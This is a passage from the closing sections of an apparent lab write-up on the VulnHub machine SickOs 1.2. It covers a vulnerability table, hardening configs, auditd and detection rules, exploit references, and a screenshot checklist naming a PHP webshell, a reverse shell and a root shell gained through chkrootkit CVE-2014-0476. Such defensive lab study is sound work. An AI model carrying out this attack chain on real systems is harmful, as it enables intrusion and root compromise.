> 4. `www-data` writing an executable into `/tmp` — detectable with auditd:
>    ```bash
>    auditctl -w /tmp -p wx -k tmp_write
>    auditctl -a always,exit -F arch=b32 -S execve -F uid=33 -k www_exec
>    ```
>
> And a **file-integrity monitor** (AIDE, Wazuh, Tripwire) would have alerted the
> moment `/tmp/update` appeared with the execute bit set.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **WebDAV enabled with no authentication** | lighttpd `mod_webdav` on `/test/` | Arbitrary file write as the web server |
| 2 | **HTTP `PUT` accepted** | `/test/` | Webshell upload → **RCE** as `www-data` |
| 3 | Directory listing enabled | `/test/` | Discovery of uploaded files |
| 4 | ETag leaks inode/size/mtime | `/` | Minor information disclosure |
| 5 | Missing security headers (`X-Frame-Options`, `X-Content-Type-Options`) | lighttpd | Clickjacking / MIME-sniffing exposure |
| 6 | **`chkrootkit 0.49` — CVE-2014-0476** | `/usr/sbin/chkrootkit` | Arbitrary root code execution |
| 7 | **Root cron job runs every 5 minutes** | `/etc/cron.d/chkrootkit` | Reliable, repeating trigger for #6 |
| 8 | `/tmp` world-writable and executable (no `noexec`) | `/tmp` | Payload staging area |
| 9 | EOL operating system | Ubuntu 12.04.4, kernel 3.2.0-23 | No security support since April 2017 |
| 10 | Old SSH host keys incl. 1024-bit DSA | OpenSSH 5.9p1 | Weak transport crypto |

**What worked:** the egress firewall (port 443 only) and the absence of any obvious
web application. **What the author got right defensively** is worth studying as much
as what was wrong.

## 9. Defensive lessons (blue team)

1. **Disable WebDAV unless you need it — and authenticate it if you do.** In
   lighttpd:
   ```
   # /etc/lighttpd/lighttpd.conf — remove mod_webdav from server.modules
   # If you must keep it:
   $HTTP["url"] =~ "^/test/" {
       webdav.activate  = "enable"
       webdav.is-readonly = "enable"        # read-only
       webdav.sqlite-db-name = "/var/lib/lighttpd/webdav.db"
       auth.require = ( "" => ( "method" => "basic", "realm" => "dav",
                                "require" => "valid-user" ) )
   }
   ```
   In Apache the equivalent is `<LimitExcept GET POST HEAD> Require all denied </LimitExcept>`.
2. **Restrict HTTP methods at the server, not just the WAF:**
   ```apache
   <Location />
       <LimitExcept GET POST HEAD OPTIONS>
           Require all denied
       </LimitExcept>
   </Location>
   ```
   lighttpd has no built-in method filter; use `mod_magnet` or a reverse proxy.
3. **Never mount a web-writable directory inside the document root.** Uploads belong
   outside the docroot, served through a handler that never executes them. Add
   `noexec` to the `/tmp` mount:
   ```text
   # /etc/fstab
   tmpfs  /tmp  tmpfs  defaults,nosuid,nodev,noexec  0  0
   ```
   This single change breaks CVE-2014-0476 completely, because `/tmp/update` could
   no longer be executed.
4. **Keep your security tools patched.** chkrootkit 0.50 fixed this in 2014. Run
   `debsecan`, `apt list --upgradable`, or a vulnerability scanner against installed
   packages — including the *defensive* ones.
5. **Audit every root-scheduled job.** The checklist from § 5.4, run weekly, with the
   output diffed against a baseline. Ask of each job: *can any non-root user influence
   what this executes?* If yes, fix it.
6. **Keep the egress firewall — and extend it.** The author's rule was good but too
   permissive (443 open to `www-data`). Tighten to explicit destinations:
   ```bash
   iptables -A OUTPUT -p tcp -m owner --uid-owner www-data -d repo.internal --dport 443 -j ACCEPT
   iptables -A OUTPUT -m owner --uid-owner www-data -j REJECT
   ```
   A web server should almost never initiate outbound connections at all.
7. **Strip server banners:**
   ```
   server.tag = "web"
   ```
   and disable ETag-based inode leakage:
   ```
   etag.use-inode  = "disable"
   etag.use-mtime  = "disable"
   ```
8. **Add security headers:**
   ```
   set-header.add-response-header = (
       "X-Frame-Options" => "DENY",
       "X-Content-Type-Options" => "nosniff",
       "Content-Security-Policy" => "default-src 'self'"
   )
   ```
9. **Retire EOL systems.** Ubuntu 12.04 stopped receiving standard security updates in
   April 2017 and ESM in April 2019. There is no acceptable configuration of this box.
10. **Detection rules to deploy today.**
    - WAF/log alert on `PUT`, `DELETE`, `MKCOL`, `PROPFIND` from external sources.
    - Alert on any `.php`/`.pl`/`.jsp` file *created* under a web root (auditd or
      fanotify watcher).
    - Alert on `/tmp/update` appearing, or on any executable created in `/tmp` by a
      service UID.
    - Alert on `/etc/sudoers*` modification (auditd: `-w /etc/sudoers -p wa`).
    - Alert on a new SUID binary appearing anywhere (`find / -xdev -newer <baseline>`).

---

## 10. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/sickos-12,144/>
- Series: <https://vulnhub.com/series/sickos,200/>
- Community writeups consulted:
  - [joenibe — Vulnhub SickOs 1.2 Writeup](https://joenibe.github.io/vulnhub/sickos1.2/)
  - [zionspike/kapi-note — SickOs 1.2](https://github.com/zionspike/vulnhub-writeup/blob/master/sick0s%201.2/kapi-note.md)
  - [dvskullz — Pen-Testing SickOs 1.2](https://github.com/dvskullz/Pen-Testing-SickOs-1.2)
  - [sv-zeroone — VulnHub SickOS 1.2 writeup](https://sv-zeroone.github.io/writeups/vh_sickos.html)
  - [infosecuritygeek — Vulnhub: SickOS 1.2](https://infosecuritygeek.com/vulnhub-sickos-1-2/)
  - [hackgrey — Vulnhub SickOS](https://www.hackgrey.com/oscp-preparation/vulnhub-sickos/)
  - [henkel-security — Vulnhub SickOs 1.2](https://henkel-security.com/2019/09/vulnhub-sickos-1-2/)
  - [gotrootid — SickOs1.2](https://www.gotrootid.com/2020-06-10/sickos1-2-vulnhub/)
  - [Kaizen Security — SickOs: 1.2 Walkthrough](https://kaizensecurity.wordpress.com/2016-05-01/sickos-1-2-walkthrough/)
  - [payatu — SickOs 1.2 (Vulnhub) Complete Walkthrough](https://payatu.com/blog/sickos-1-2-vulnhub-complete-walkthrough-and-guide/)
  - [dollarboysushil — VulnHub SickOS 1.2 Writeup](https://infosecwriteups.com/vulnhub-sickos-1-2-writeup-by-dollarboysushil-9e1077921adf)
  - [iam_yshnav — SickOs 1.2 Full Exploit Walkthrough](https://medium.com/@iam_yshnav_/sickos-1-2-vulnhub-full-exploit-walkthrough-step-by-step-dcf1051419dc)
  - [ghanigeek — SickOS 1.2 Walkthrough](https://ghanigeek.wordpress.com/2018/11/03/sickos-1-2-walkthrough/)
- Exploits / advisories:
  - [CVE-2014-0476 — chkrootkit before 0.50 executes /tmp/update as root](https://nvd.nist.gov/vuln/detail/CVE-2014-0476)
  - [Exploit-DB 33899 — Chkrootkit 0.49 Local Root Exploit](https://www.exploit-db.com/exploits/33899)
  - [Exploit-DB 38775 — Chkrootkit < 0.50 LPE](https://www.exploit-db.com/exploits/38775)
  - [Rapid7 — exploit/unix/local/chkrootkit](https://www.rapid7.com/db/modules/exploit/unix/local/chkrootkit/)
  - [Rapid7 — auxiliary/scanner/http/http_put](https://www.rapid7.com/db/modules/auxiliary/scanner/http/http_put/)
  - [Nmap `http-put` NSE script](https://nmap.org/nsedoc/scripts/http-put.html) · [`http-methods`](https://nmap.org/nsedoc/scripts/http-methods.html)
- Standards / background:
  - [RFC 4918 — HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)](https://datatracker.ietf.org/doc/html/rfc4918)
  - [RFC 9110 — HTTP Semantics (`OPTIONS`, `Allow`, `417 Expectation Failed`)](https://datatracker.ietf.org/doc/html/rfc9110)
  - [lighttpd mod_webdav documentation](https://redmine.lighttpd.net/projects/lighttpd/wiki/Mod_webdav)
  - [`davtest`](https://github.com/g0tmi1k/davtest) · [g0tmi1k's reverse-shell cheat sheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
  - [`crontab(5)` man page](https://man7.org/linux/man-pages/man5/crontab.5.html) · [`sudoers(5)`](https://man7.org/linux/man-pages/man5/sudoers.5.html)
  - [LinEnum](https://github.com/rebootuser/LinEnum) · [GTFOBins](https://gtfobins.github.io)

---

## 11. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 22 and 80, lighttpd banner
- [ ] `images/02-test-dir.png` — `dirb` finding the empty `/test/` listing
- [ ] `images/03-put.png` — `OPTIONS` response with `DAV: 1,2` and `Allow: PUT`
- [ ] `images/04-webshell.png` — `shell.php?cmd=id` returning `www-data`
- [ ] `images/05-shell.png` — reverse shell on port 443
- [ ] `images/06-chkrootkit.png` — `chkrootkit -V` → 0.49 and the cron entries
- [ ] `images/07-root.png` — root shell after the cron job fires
- [ ] `images/08-flag.png` — `7d03aaa2bf93d80040f3f22ec6ad9d5a.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
